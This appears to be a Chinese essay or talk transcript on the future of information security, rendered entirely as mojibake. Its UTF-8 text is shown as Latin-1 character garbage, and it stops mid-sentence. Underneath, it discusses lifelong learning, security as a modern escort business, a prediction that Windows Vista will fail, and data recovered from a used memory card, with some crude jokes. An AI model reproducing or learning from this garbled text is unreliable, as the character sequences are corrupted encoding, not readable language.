æŠ€æœ¯å¯ä»¥åˆ†ä¸ºå­¦æœ¯ç•Œå’Œå·¥ä¸šç•Œï¼Œè¿™ä¸¤è€…éƒ½æœ‰æ„ä¹‰ï¼Œäº’æœ‰äº¤å‰ï¼Œä½†å…¶å®åŒºåˆ«ä¹Ÿå¾ˆå¤§ã€‚ä¼ä¸šéœ€è¦çš„æŠ€æœ¯ä¸»è¦æ˜¯å·¥ä¸šç•Œçš„æŠ€æœ¯ï¼Œè€Œåœ¨å­¦æ ¡çš„ç¯å¢ƒé‡Œï¼Œä¸å°‘äººå­¦æœ¯ä¸Šä¸é”™ï¼Œä½†å¯¹å·¥ä¸šç•Œçš„æ–¹å‘å’Œéœ€æ±‚äº†è§£æ¯”è¾ƒå°‘ã€‚å‰é˜µå­æœ‰ä½é«˜æ ¡çš„é’å¹´æ•™å¸ˆç»™æˆ‘å†™ä¿¡ï¼Œè°ˆäº†ä»–åšçš„ç ”ç©¶ã€‚æˆ‘å‘ç°ä»–çš„æŠ€æœ¯å¾ˆå¥½ï¼Œä½†åšè¿‡çš„ä¸œè¥¿ç¦»å·¥ä¸šç•Œæ¯”è¾ƒè¿œã€‚åŒ—ç¾åäººå®‰å…¨å­¦æœ¯ç•Œçš„å®‹æ™“ä¸œï¼ˆDawn Songï¼‰æ•™æˆã€è’‹æ—­å®ªï¼ˆXuxianJiangï¼‰æ•™æˆéƒ½æ˜¯æŠŠå­¦æœ¯å’Œåº”ç”¨ç»“åˆçš„æ¯”è¾ƒå¥½çš„ä»£è¡¨ã€‚ä½ ä»¬å¯ä»¥è¯»ä¸€è¯»ä»–ä»¬çš„ç ”ç©¶ï¼Œä½“ä¼šä¸€ä¸‹ã€‚ è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯é˜…è¯»å·¥ä¸šç•Œå®‰å…¨ä¼šè®®çš„èµ„æ–™ã€‚ä»è¿™äº›èµ„æ–™ä¸­ä¹Ÿè®¸å­¦ä¸åˆ°ä»€ä¹ˆæŠ€æœ¯ç»†èŠ‚ï¼Œä½†å¯ä»¥çœ‹çœ‹å¤§å®¶åœ¨åšäº›ä»€ä¹ˆï¼Œå“ªäº›è‡ªå·±æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œç„¶åé€‰ä¸€ä¸¤ä¸ªæ–¹å‘ï¼Œå¯»æ‰¾ç›¸å…³èµ„æ–™æ·±å…¥å­¦ä¹ ã€‚ ä¿¡æ¯å®‰å…¨èµ°å‘æ¼«è°ˆ æ‘é•¿airsupply#[0x557.org](http://0x557.org/)é‚€æˆ‘æ¥B105æ²™é¾™å’Œå¤§å®¶é—²æ‰¯ã€‚è€Œæˆ‘è¿‘æ¥çš„å·¥ä½œæ˜¯æ‹‰ç£¨å±…å¤šï¼Œæ¥å®¢å…¶æ¬¡ï¼Œå®åœ¨æ²¡æœ‰ä»€ä¹ˆæ–°è´§ã€‚æ‘é•¿è¯´ï¼šä¸å¿…è®²æŠ€æœ¯ï¼Œå¯ä»¥è°ˆè°ˆâ€œä¿¡æ¯å®‰å…¨çš„ç°çŠ¶å’Œæœªæ¥â€ã€‚æˆ‘æ€å‰æƒ³åï¼Œè§‰å¾—è¿™ä¸ªé¢˜ç›®çº²é¢†æ€§å¤ªå¼ºï¼Œæˆ‘è¿™ç‚¹èµ„å†è®²èµ·æ¥æ˜¾ç„¶è‡ªä¸é‡åŠ›ã€‚è¿˜æ˜¯æ”¹ç§°â€œä¿¡æ¯å®‰å…¨èµ°å‘æ¼«è°ˆâ€æ˜¾å¾—æ¯”è¾ƒä½è°ƒã€‚æ¼«è°ˆæ¼«è°ˆï¼Œå°±æ˜¯æ¼«å¤©ä¹±è°ˆï¼Œè°ˆé”™äº†ä¸è¦ç´§ã€‚ä¸‡ä¸€è°ˆå¾—å¯¹ï¼Œå°±ç®—è’™ä¸Šäº†ã€‚ 1. å­¦ä»€ä¹ˆæŠ€æœ¯ä¸ä¼šè¿‡æ—¶ï¼Ÿ å¸¸æœ‰äººè·Ÿæˆ‘å‘ç‰¢éªšï¼Œè¯´ææŠ€æœ¯å¤ªç´¯ï¼Œæ€»è¦å­¦æ–°ä¸œè¥¿ã€‚è¿˜æ€»é—®ï¼Œå®‰å…¨æŠ€æœ¯æœªæ¥çš„æ–¹å‘æ˜¯ä»€ä¹ˆï¼Œå­¦ä»€ä¹ˆæŠ€æœ¯ä¸ä¼šè¿‡æ—¶ï¼Œäº”å¹´åå¹´ä¹‹åè¿˜èƒ½æ··é¥­ï¼Ÿ æ¯åˆ°è¿™æ—¶æˆ‘éƒ½å¾ˆå°´å°¬ï¼Œä¸çŸ¥é“åº”è¯¥è¯´ä»€ä¹ˆã€‚ æœ‰äº›æœ‹å‹çŸ¥é“ï¼Œæˆ‘è¯»äº†äº”å¹´åŒ»ç§‘å¤§å­¦ã€‚å¾ˆå¤šäººè®¤ä¸ºåŒ»ç”Ÿæ˜¯ä¸€ä¸ªç¨³å®šçš„èŒä¸šï¼ŒåŒ»å­¦æ˜¯ä¿å€¼çš„çŸ¥è¯†ï¼Œå­¦å®Œäº†å°±å¯ä»¥èººåœ¨ä¸Šé¢åƒä¸€è¾ˆå­ã€‚å…¶å®æ°æ°ç›¸åã€‚ç¨å¤§ä¸€ç‚¹çš„åŒ»é™¢éƒ½æœ‰è‡ªå·±çš„å›¾ä¹¦é¦†ã€‚å¹´è½»åŒ»ç”Ÿå°±ä¸ç”¨è¯´äº†ï¼Œå¾ˆå¤šå…­åå¤šå²çš„è€åŒ»ç”Ÿä¸Šé—¨è¯Šï¼ŒæŠ½å±‰é‡Œè¿˜æ”¾ç€ä¸€æœ¬ä¸“ä¸šä¹¦ï¼Œæœ‰ç—…äººçš„æ—¶å€™å°±ç»™äººçœ‹ç—…ï¼Œæ²¡ç—…äººå°±æ‹‰å¼€æŠ½å±‰çœ‹ä¹¦ã€‚ä»¥å‰å„¿ç§‘çš„è€ä¸»ä»»å¯¹æˆ‘è¯´è¿‡ï¼šå¹²åŒ»ç”Ÿè¿™ä¸€è¡Œï¼ŒåŠä¸ªæœˆä¸å»å›¾ä¹¦é¦†è¯»æ–‡çŒ®ï¼Œå°±è½åäº†ã€‚æ¯›ä¸»å¸­è¯´â€œä¸‰å¤©ä¸å­¦ä¹ ï¼Œèµ¶ä¸ä¸Šåˆ˜å°‘å¥‡ã€‚â€åŒ»ç”Ÿè¿™ä¸€è¡Œå°±æ˜¯è¿™æ ·ã€‚ æˆ‘ä»¬å®¶ä¹¡æœ‰å¥ä¿—è¯ï¼Œå«â€œçœ‹åˆ«äººåƒè±†è…è§‰å¾—ç‰™é½¿å¿«â€ã€‚å¾ˆå¤šæŠ€æœ¯äººå‘˜éƒ½è§‰å¾—é”€å”®è¿™ä¸ªæ´»å„¿å¥½å¹²ï¼Œå·¥ä½œå°±æ˜¯åƒå–ç©ä¹æ··å…³ç³»ï¼ŒæŒ£é’±åˆå¤šï¼Œè¿˜ä¸è´¹è„‘å­ã€‚æˆ‘åªèƒ½è¯´â€œé‚£ä½ å»è¯•è¯•çœ‹å§â€ã€‚å…ˆç”­è¯´é”€å”®ç»å¯¹ä¸æ˜¯ä¸è´¹è„‘å­çš„æ´»å„¿ï¼Œä¹Ÿç»å¯¹ä¸æ˜¯å…‰é â€œåƒå–ç©ä¹æ··å…³ç³»â€å°±è¡Œçš„ã€‚å°±ç®—æ˜¯ï¼Œè¿™â€œåƒå–ç©ä¹æ··å…³ç³»â€ä¸ƒä¸ªå­—å²‚æ˜¯ç®€å•çš„ï¼Ÿè°åˆšä»å°ä¸Šä¸‹æ¥æ»¡æ€€è½å¯ä½†è¿˜æœ‰ä¸€äº›é‡è¦å…³ç³»ï¼Ÿè°è™½ç„¶åªæ˜¯ä¸ªæ™®é€šæ•™æˆä½†æ˜¯è¯¸å¤šå¼Ÿå­éƒ½èº«å±…è¦èŒï¼Ÿè°æ‰‹é‡Œæœ‰æŒ‡æ ‡ä½†è‡ªå·±ä¸èƒ½å®Œå…¨åšä¸»ï¼Ÿè°è¡Œæ”¿çº§åˆ«é«˜ä½†æ²¡æœ‰å®æƒï¼Ÿæ–°ä¸Šæ¥ä¸€æŠŠæ‰‹æ˜¯çˆ±äººæ°‘å¸çˆ±é«˜å°”å¤«çˆ±ç‡•é²ç¿…è¿˜æ˜¯çˆ±åˆ¶æœæ†ç»‘ï¼Ÿäº¬åŸé‡Œä½•å¤„ç¯æœ€çº¢ä½•å¤„é…’æœ€ç»¿ï¼Ÿâ€”â€”è¿™äº›ä¿¡æ¯éƒ½æ˜¯åŠ¨æ€çš„ï¼Œå˜åŒ–çš„ï¼Œè€Œä¸”é è®¢é˜…é‚®ä»¶åˆ—è¡¨å’Œçœ‹BBSæ˜¯å¾—ä¸åˆ°çš„ã€‚ä¸æ”¶é›†ï¼Œä¸å­¦ä¹ ï¼Œå’‹æ•´ï¼Ÿ å…¬äº¤è½¦ç«™ç‰Œä¸Šè´´çš„é‚£äº›æ‹›è˜èŒä½ï¼Œæ²¡æœ‰å­¦å†è¦æ±‚ï¼Œåªè¦â€œå½¢è±¡å¥½ï¼Œæ°”è´¨ä½³ï¼Œæ€æƒ³å¼€æ”¾â€å°±å¯ä»¥â€œæ—¥è–ª1500ä»¥ä¸Šâ€ï¼Œè¿™ä¸ªé’±æŒ£èµ·æ¥ç®—æ˜¯å®¹æ˜“åˆè½»æ¾äº†å§ï¼Ÿå…¶å®å³ä¾¿ä»äº‹è¿™ç§åœ°çƒä¸Šæœ€å¤è€çš„èŒä¸šï¼Œå­¦å’Œä¸å­¦é‚£ä¹Ÿæ˜¯å¤§å¤§ä¸åŒã€‚è‹å°å°ã€æå¸ˆå¸ˆçš„æ—¶ä»£ï¼Œè¦ä¸Šå¤´ç‰Œéƒ½å¾—ä¼šç´æ£‹ä¹¦ç”»ï¼Œå¡«è¯å”±æ›²ã€‚åˆ°äº†åé‡Œæ´‹åœºä¸Šæµ·æ»©ï¼Œæ ¹æ®æ‰æƒ…é«˜ä½ä¹Ÿè¦åˆ†å‡ºâ€œä¹¦å¯“â€ã€â€œé•¿ä¸‰â€ã€â€œå¹ºäºŒâ€æ¥ï¼Œå•¥éƒ½ä¸ä¼šå°±åªèƒ½æ··â€œé‡é¸¡å ‚å­â€ã€‚ç°åœ¨æ²¡é‚£ä¹ˆå¤šè®²ç©¶äº†ï¼Œä¸è¿‡â€œä¸€å‰‘ç©¿å¿ƒæ¯’é¾™é’»ï¼Œå†°ç«çº¢ç»³ç©ºä¸­é£â€è¿™äº›åŸºæœ¬ä¸šåŠ¡æ€»è¿˜å¾—å­¦ï¼Œè¦ä¸ç„¶ä¹Ÿè¿˜æ˜¯â€œé‡é¸¡å ‚å­â€ã€Street-Walkerçš„å‘½ã€‚ é‚£ç©¶ç«Ÿæœ‰æ²¡æœ‰ä»€ä¹ˆæ˜¯å­¦äº†ä¸ä¼šè¿‡æ—¶çš„å‘¢ï¼Ÿå­¦ä¼šå­¦ä¹ çš„æ–¹æ³•ï¼Œå­¦ä¼šä»å­¦ä¹ ä¸­è·å¾—å¿«ä¹ï¼Œè¿™æ˜¯æ°¸ä¸è¿‡æ—¶çš„ã€‚å¦‚æœäº«å—ä¸äº†æ±²å–çŸ¥è¯†çš„å¿«ä¹ï¼Œé‚£å°±ä¸é€‚åˆåšä»»ä½•éœ€è¦è„‘åŠ›çš„å·¥ä½œã€‚ 2. ä¿¡æ¯å®‰å…¨çš„æœªæ¥å¦‚ä½•ï¼Ÿ æœ€è¿‘ä¸€ä¸¤å¹´ï¼Œå¤§å®¶æ„Ÿè§‰ä¿¡æ¯å®‰å…¨å½¢åŠ¿æ¯”å‰ä¸¤å¹´è¦å¥½äº›äº†ï¼Œä¸å†åƒ2002ã€2003å¹´çš„æ—¶å€™ï¼Œæ¼æ´æ»¡å¤©é£ï¼Œè •è™«éåœ°çˆ¬ã€‚äºæ˜¯æœ‰äººå¼€å§‹æ‹…å¿ƒï¼šæ¼æ´å°‘äº†çš„ç¡®æœ‰åˆ©äºä¿¡æ¯å®‰å…¨ï¼Œä½†è¿™æ ·ä¸‹å»ï¼Œæœ€ç»ˆä¼šä¸ä¼šå¯¼è‡´æˆ‘ä»¬å¤±ä¸šï¼Ÿ å¯¹æ­¤æˆ‘æ˜¯è¿™æ ·çœ‹çš„ï¼šä¿¡æ¯å®‰å…¨æŠ€æœ¯çš„å‘å±•å°†æ¥ä¸€å®šä¼šæœ‰æŠ€æœ¯æ–¹å‘ä¸Šçš„å˜åŒ–ï¼Œä½†ä¸ä¼šæœ‰å‰é€”ä¸Šçš„é—®é¢˜ã€‚ ç”µå½±ã€Šç¬‘å‚²æ±Ÿæ¹–ã€‹ä¸­ä»»æˆ‘è¡Œè¯´ï¼šâ€œæœ‰äººå°±æœ‰æ±Ÿæ¹– â€ã€‚ä»æœ‰é©¬å¸®çš„é‚£ä¸€å¤©èµ·ï¼Œå°±æœ‰é©¬è´¼ï¼›ä»æœ‰æµ·èˆ¹çš„é‚£ä¸€å¤©èµ·ï¼Œå°±æœ‰æµ·ç›—ã€‚æœ‰ç›—è´¼æ€ä¹ˆåŠï¼Ÿç†è®ºä¸Šé å®˜åºœï¼Œå®é™…ä¸Šé è‡ªå·±ã€‚è‡ªå·±æä¸å®šæ€ä¹ˆåŠï¼ŸèŠ±é’±æ‰¾é•–å±€ã€‚å‡ åƒå¹´æ¥ï¼Œä»€ä¹ˆæ—¶å€™è¿™ä¸ªæ ¼å±€æ”¹å˜è¿‡ï¼Ÿè¿‡å»é•–å±€ä¿çš„æ˜¯é‡‘é“¶ï¼Œä»Šå¤©æˆ‘ä»¬ä¿çš„ï¼Œå½’æ ¹ç»“åº•ä¹Ÿè¿˜æ˜¯é‡‘é“¶ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼Œæˆ‘ä»¬è¿™ä¸ªè¡Œä¸šå…¶å®æ˜¯é•–å±€å‘å±•è¿›å…¥ä¿¡æ¯æ—¶ä»£åï¼Œå‡ºç°å‰é¢è¯´çš„â€œæŠ€æœ¯æ–¹å‘ä¸Šçš„å˜åŒ–â€ï¼Œè€ŒåŒ–ç”Ÿå‡ºæ¥çš„ã€‚ æ‰€ä»¥ï¼Œåªè¦äººç±»ç¤¾ä¼šè¿˜å­˜åœ¨ä¿¡æ¯äº¤æ¢è¡Œä¸ºï¼Œåªè¦è¿™äº›ä¿¡æ¯äº¤æ¢æ¶‰åŠåˆ°åˆ©ç›Šï¼Œå°±ä¼šæœ‰äººè¯•å›¾æ”¹å˜è¿™äº›åˆ©ç›Šçš„åˆ†é…è§„åˆ™ï¼Œå°±ä¼šæœ‰å¯¹ä¿¡æ¯å®‰å…¨çš„éœ€æ±‚ã€‚ç™¾å·å½’å¤§æµ·ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ¹æœ¬æ³•åˆ™ï¼Œä¸ç®¡ä¸­é—´æ€ä¹ˆä¹æ›²åå…«å¼¯ï¼Œæœ€ç»ˆï¼Œè¿™ä¸ªæ ¹æœ¬æ³•åˆ™æ˜¯ä¸ä¼šæœ‰ä»€ä¹ˆå˜åŒ–çš„ã€‚ å¤§å®¶æ„Ÿè§‰ä¿¡æ¯å®‰å…¨å½¢åŠ¿æ¯”å‰ä¸¤å¹´è¦å¥½ï¼Œå¯èƒ½ä¸€ä¸ªä¸»è¦åŸå› å°±æ˜¯çœ‹åˆ°è½¯ç¡¬ä»¶å‚å•†å¯¹å®‰å…¨è¶Šæ¥è¶Šé‡è§†ï¼Œå®‰å…¨æªæ–½è¶Šæ¥è¶Šå¤šã€‚è€Œçœ‹èµ·æ¥ï¼Œæ¯”è¾ƒä¸¥é‡çš„å®‰å…¨æ¼æ´ä¼¼ä¹æœ‰å‡å°‘çš„è¶‹åŠ¿ã€‚äº’è”ç½‘ä¸Šå‡ ä¹æ¯å°æœºå™¨éƒ½æœ‰é˜²ç«å¢™ä¿æŠ¤ã€‚æ–°çš„Fedora Coreé»˜è®¤å¼€å¯äº†Linuxçš„å¾ˆå¤šå®‰å…¨ç‰¹æ€§ï¼Œè€Œä¸”çœ‹èµ·æ¥ä»¥åä¼šä¸€ç›´è¿™æ ·ä¸‹å»ã€‚å¾®è½¯å°†è¦å‘å¸ƒçš„Vistaä¹Ÿä¼¼ä¹æ˜¯ä¸€ä¸ªå¼ºå¥æ— æ¯”çš„ç³»ç»Ÿã€‚è¿™ä¸€åˆ‡ä»¿ä½›éƒ½åœ¨æš—ç¤ºä¿¡æ¯å®‰å…¨ä¼šæˆä¸ºä¸€ä¸ªå†å²é˜¶æ®µæ€§çš„äº‹ç‰©ï¼Œéšç€å®‰å…¨å½¢åŠ¿çš„è¿›ä¸€æ­¥å¥½è½¬ï¼Œè¿™ä¸ªè¡Œä¸šä¹Ÿä¼šé€æ¸æ·¡å»ã€‚ ä¸‹é¢æˆ‘ä»¬å…·ä½“æ¥è°ˆè°ˆè¿™äº›é—®é¢˜ã€‚ Vistaæ˜¯ä¸ªçº¸è€è™ å¾ˆå¤šæWindowså®‰å…¨çš„äººæœ€è¿‘éƒ½ç€å®è¢«å¾®è½¯çš„Vistaç»™å“ç€äº†ï¼Œè§‰å¾—ä»¥åWindowså°±å®‰å…¨äº†ï¼Œæ²¡ä»€ä¹ˆå¯æäº†ã€‚å¾®è½¯å·ç§°è¿™ä¸ªç³»ç»Ÿæ¯”å‰ä»£å¤§å¤§å¢å¼ºäº†å®‰å…¨æ€§ã€‚ä¸è¿‡å¤§å®¶åˆ«å¿˜äº†ï¼Œå¾®è½¯æ¨å‡ºWindows 2000çš„æ—¶å€™æ˜¯è¿™ä¹ˆå®£ä¼ çš„ï¼Œæ¨å‡ºWindows XPçš„æ—¶å€™æ˜¯è¿™ä¹ˆå®£ä¼ çš„ï¼Œæ¨å‡ºWindows 2003çš„æ—¶å€™ä¹Ÿæ˜¯è¿™ä¹ˆå®£ä¼ çš„ã€‚ å½“ç„¶ï¼Œå®äº‹æ±‚æ˜¯åœ°è¯´ï¼Œä»æˆ‘ä»¬æœ€è¿‘ä¸€æ®µæ—¶é—´å¯¹Vista Betaç‰ˆçš„ç ”ç©¶æ¥çœ‹ï¼Œè¿™ä¸ªæ–°ç³»ç»Ÿçš„ç¡®é‡‡å–äº†å¾ˆå¤šæ–°çš„å®‰å…¨ç‰¹æ€§ï¼Œå¤§å¤§å¢åŠ äº†ä¼ ç»Ÿæ¼æ´çš„åˆ©ç”¨éš¾åº¦ï¼›æ–°çš„å¼€å‘è¿‡ç¨‹å’Œå¼€å‘å·¥å…·ä¹Ÿçš„ç¡®é™ä½äº†æ¼æ´å‘ç”Ÿçš„å‡ ç‡ï¼Œæ¯”èµ·ä¹‹å‰çš„äº§å“åœ¨å®‰å…¨ä¸Šå¯ä»¥è¯´æœ‰ä¸€ä¸ªå¤§é£è·ƒã€‚ ä½†å…³é”®é—®é¢˜æ˜¯ï¼šäººä»¬çœŸçš„ä¼šæ¥å—è¿™æ ·ä¸€ä¸ªç”¨å¤§é‡ç¡®è®¤çª—å£å’Œé™åˆ¶æªæ–½æ¥è™å¾…ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿä¹ˆï¼Ÿæ›´åˆ«æå¯æ€•çš„èµ„æºå ç”¨å’Œä¹Œé¾Ÿèˆ¬çš„é€Ÿåº¦äº†ã€‚è‡³å°‘æˆ‘æ˜¯ç»å¯¹ä¸ä¼šç”¨è¿™ä¸ªä¸œè¥¿çš„ã€‚ä¼°è®¡åœ¨Vistaæ­£å¼ä¸Šå¸‚åï¼Œå„ç§Windowsä¼˜åŒ–è½¯ä»¶è‚¯å®šä¼šç«‹å³æä¾›å…³é—­è¿™äº›å®‰å…¨ç‰¹æ€§çš„åŠŸèƒ½ã€‚ ä¿¡æ¯å®‰å…¨ï¼Œä¿¡æ¯ä¸ºè‚‰ï¼Œå®‰å…¨ä¸ºéª¨ã€‚è‚‰æ— éª¨åˆ™ä¸ç«‹ï¼Œéª¨æ— è‚‰åˆ™ä¸æ´»ã€‚èš¯èš“ä¹‹ç±»ï¼Œåªæœ‰è‚‰æ²¡æœ‰éª¨ï¼Œå°šå¯ä»¥æ…¢æ…¢è •åŠ¨ï¼Œå¯ä»¥ä¸å¤ªç²¾å½©åœ°æ´»ä¸‹å»ï¼›ä½†æ˜¯æ²¡æœ‰è‚‰ï¼Œå…‰å‰©éª¨å¤´ï¼Œä»€ä¹ˆåŠ¨ç‰©ä¹Ÿæ´»ä¸äº†ã€‚å®‰å…¨æªæ–½å¯¹ç”¨æˆ·çš„æ‰°åŠ¨è¶Šå°ï¼Œå°±è¶Šå®¹æ˜“è¢«æ¥å—ã€‚æ—¶åˆ»å‘æŒ¥ä½œç”¨ï¼Œå´å‡ ä¹æ„Ÿè§‰ä¸åˆ°å®ƒçš„å­˜åœ¨ï¼Œè¿™å°±æ˜¯å®‰å…¨å·¥ä½œçš„è‡³å–„å¢ƒç•Œï¼Œä¹Ÿæ˜¯æœ€éš¾è¾¾åˆ°çš„ç›®æ ‡ã€‚è¦ä¸ç„¶ä¸ºä»€ä¹ˆæœé›·æ–¯çš„è¶…è–„å‹å–å¾—è´µè¿˜é‚£ä¹ˆå—æ¬¢è¿ã€‚ åœ¨æˆ‘çœ‹æ¥ï¼ŒVistaå°±æ˜¯ä¸ªè‡³å°‘ä¸€å˜ç±³åšçš„æœé›·æ–¯ã€‚ ä»»ä½•ä¼ä¸šçš„ç›®æ ‡éƒ½æ˜¯æŒ£é’±ï¼Œåªæœ‰å½“ç»´æŠ¤ç”¨æˆ·å®‰å…¨å’ŒæŒ£é’±è¿™ä¸ªç›®æ ‡æ°å¥½å»åˆæ—¶ï¼Œå®ƒå°±ä¼šè®¾æ³•å¢å¼ºç”¨æˆ·å®‰å…¨ï¼Œå¦‚æœç»´æŠ¤ç”¨æˆ·å®‰å…¨å½±å“äº†æŒ£é’±è¿™ä¸ªç›®æ ‡ï¼Œå®ƒä¸€å®šä¼šè€ƒè™‘é‡æ–°è°ƒæ•´ä¸¤è¾¹çš„ç ç ã€‚ ä»Šå¤©æˆ‘åœ¨è¿™é‡Œå…³èµ·é—¨æ¥åšä¸ªå¤§èƒ†çš„é¢„è¨€ï¼šVistaç»ˆå°†æˆä¸ºä¸€ä¸ªç±»ä¼¼Windows MEé‚£æ ·æ²¡ä»€ä¹ˆäººæ„¿æ„ç”¨çš„å¤±è´¥äº§å“ã€‚å¾®è½¯ç”šè‡³å¯èƒ½ä¼šåœ¨Vistaåç»­çš„Service Packæˆ–è€…ä¸‹ä¸€ä»£æ“ä½œç³»ç»Ÿä¸­å–æ¶ˆæˆ–è€…å‡å¼±ä¸€äº›å½±å“ç”¨æˆ·ä½“éªŒçš„å¼ºåˆ¶å®‰å…¨ç‰¹æ€§ã€‚ å¦å¤–ï¼Œè¿™ä¸ªä¸€å˜ç±³åšçš„æœé›·æ–¯æ˜¯å¦çœŸçš„å°±æ¯”0.03mmçš„è¶…è–„å‹å®‰å…¨333.33å€ï¼Ÿå€¼å¾—æ€€ç–‘ã€‚Windows 95åªæœ‰1500ä¸‡è¡Œä»£ç ï¼ŒWindows 98æœ‰1800ä¸‡è¡Œä»£ç ï¼ŒWindows XP æœ‰3500ä¸‡è¡Œã€‚Vista åˆ™æœ‰5000ä¸‡è¡Œï¼Œæ¯”XPå¤šå‡ºäº†40%ã€‚æ–°ä»£ç å¸¦æ¥æ–°åŠŸèƒ½ï¼ŒåŒæ ·ï¼Œæ–°ä»£ç ä¹Ÿå¿…ç„¶ä¼šå¼•å…¥æ–°æ¼æ´ã€‚ æ¯›ä¸»å¸­è¯´è¿‡ï¼Œâ€œä¸€åˆ‡ååŠ¨æ´¾éƒ½æ˜¯çº¸è€è™ã€‚çœ‹èµ·æ¥ï¼ŒååŠ¨æ´¾çš„æ ·å­æ˜¯å¯æ€•çš„ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆäº†ä¸èµ·çš„åŠ›é‡ã€‚ä»é•¿è¿œçš„è§‚ç‚¹çœ‹é—®é¢˜ï¼ŒçœŸæ­£å¼ºå¤§çš„åŠ›é‡ä¸æ˜¯å±äºååŠ¨æ´¾ï¼Œè€Œæ˜¯å±äºäººæ°‘ã€‚â€åœ¨æˆ‘çœ‹æ¥ï¼ŒVistaä¹Ÿå¾ˆå¯èƒ½æ˜¯ä¸ªçº¸è€è™ã€‚å‡ä»¥æ—¶æ—¥ï¼Œçº¸è€è™çš„è½¯è£†å¿…ç„¶ä¼šè¢«ä¸€ä¸€å‘ç°ã€‚ é€€ä¸€æ­¥è®²ï¼Œå³ä¾¿Vistaã€Fedora Coreç­‰ä¸ºä»£è¡¨çš„æ–°ä¸€æ‹¨æ“ä½œç³»ç»ŸçœŸçš„æ˜¯ä¸€ä¸ªæ¼æ´éƒ½æ²¡æœ‰äº†ï¼Œä»æ•´ä½“ä¸Šçœ‹ï¼Œä¿¡æ¯å®‰å…¨æ€åŠ¿ä»ç„¶ä¸ä¹è§‚ã€‚ æœªæ¥ï¼Œå„è¡Œå„ä¸šå„é¢†åŸŸéƒ½å°†æ•°å­—åŒ–ï¼Œç”Ÿæ´»çš„æ–¹æ–¹é¢é¢éƒ½ç¦»ä¸å¼€ä¿¡æ¯æŠ€æœ¯ã€‚å„ç§ä¸åŒçš„ä¿¡æ¯æŠ€æœ¯äº¤ç»‡åœ¨ä¸€èµ·ï¼Œæ„æˆå·¨å¤§çš„å®ä¿¡æ¯ä¸–ç•Œï¼Œæ¯”æˆ‘ä»¬ç°åœ¨çš„äº’è”ç½‘å¤§å¾—å¤šï¼Œå¤æ‚å¾—å¤šã€‚å®‰å…¨é—®é¢˜ä¹Ÿä¼šéšä¹‹å¤æ‚å’Œä¸¥é‡ã€‚ç°åœ¨ä¸ªäººç”µè„‘ä¸Šé‚£ä¸€ç‚¹ç‚¹æ¼æ´åˆ°é‚£æ—¶å€™çœ‹å°±å¾ˆæ¸ºå°äº†ã€‚æƒ³æƒ³çœ‹ï¼Œä»¥å‰æ˜¯ä½ çš„ç”µè„‘è¢«å…¥ä¾µï¼Œä»¥åä½ çš„ç”µé¥­é”…è¢«å…¥ä¾µï¼›è¿‡å»æ˜¯è®©ä½ ä¸Šç½‘æ…¢ï¼Œä»¥åè®©ä½ åƒå¤¹ç”Ÿé¥­ã€‚ æ—¢ç„¶è¿™æ ·ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜è¦ç”¨ä¿¡æ¯æŠ€æœ¯å‘¢ï¼Ÿè¿™ä¸€é¡µPPTçš„æ ‡é¢˜å«åšâ€œä¿¡æ¯æŠ€æœ¯æ˜¯ä¸ªç‹ç‹¸ç²¾â€ã€‚ç‹ç‹¸ç²¾ï¼Œå¤§å®¶çŸ¥é“æ˜¯ä»€ä¹ˆå§ï¼Œå°±æ˜¯ä½ çŸ¥é“å¥¹å¯èƒ½ä¼šå®³ä½ ï¼Œä½†èº«ä¸ç”±å·±ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿˜æ˜¯å› ä¸ºå¥½ï¼Œè¶³å¤Ÿå¥½åˆ°è®©ä½ æ„¿æ„å†’è¿™ä¸ªé™©ã€‚ ä¸Šé«˜ä¸­æ—¶å€™ï¼Œå­¦æ‘„å½±ï¼Œç”¨èƒ¶ç‰‡ï¼Œå¤§å¤å¤©ä¹Ÿè¦è‡ªå·±é—·åœ¨æš—æˆ¿é‡Œå†²æ´—ã€‚ç°åœ¨éƒ½æ˜¯æ•°ç ç›¸æœºï¼Œéšæ‹éšçœ‹ï¼Œå¤šä¹ˆæ–¹ä¾¿ã€‚ä¸Šå¤§å­¦çš„æ—¶å€™ï¼Œå¤§å®¶éƒ½ç”¨â€œWalk-Manâ€ï¼Œé˜”æ°”ä¸€ç‚¹çš„å¬éšèº«CDã€MDã€‚ç°åœ¨ä¸€ä¸ªç«æŸ´ç›’å¤§å°çš„MP3å°±éƒ½æå®šäº†ï¼Œä»·é’±ä¹Ÿä¾¿å®œã€‚ æˆ‘åœ¨ç½‘ä¸Šä¹°è¿‡ä¸€ä¸ªäºŒæ‰‹CFå¡ã€‚æ‹¿å›æ¥ï¼Œç”¨æ•°æ®æ¢å¤è½¯ä»¶ä¸€çœ‹ï¼Œé‡Œé¢æœ‰å‡ å¼ åˆ‘äº‹æ¡ˆä»¶çš„ç°åœºç…§ç‰‡ï¼Œè¡€è¿¹æ–‘æ–‘ã€‚è¿˜æ‹äº†å—å®³äººã€‚è¿™ä¸ªå¡ä¸çŸ¥é“æ˜¯å“ªä¸ªæ´¾å‡ºæ‰€æ·˜æ±°ä¸‹æ¥çš„ã€‚å¦‚æœè¿½ç©¶èµ·æ¥ï¼Œè‚¯å®šè¦æœ‰äººå—åˆ°ä¸å¥½çš„å½±å“ã€‚è¿™ç§äº‹æƒ…ï¼Œåœ¨ç”¨èƒ¶ç‰‡çš„æ—¶ä»£ä¸ä¼šæœ‰ã€‚ä½†ä»Šå¤©ï¼Œæ–°é—®é¢˜å°±å‡ºç°äº†ã€‚ è¿™äº›æ˜¯ä»€ä¹ˆå•Šï¼Ÿæ˜¯ç‹ç‹¸ç²¾ã€‚ç‹ç‹¸ç²¾å¤ªå¥½äº†ï¼Œä½ 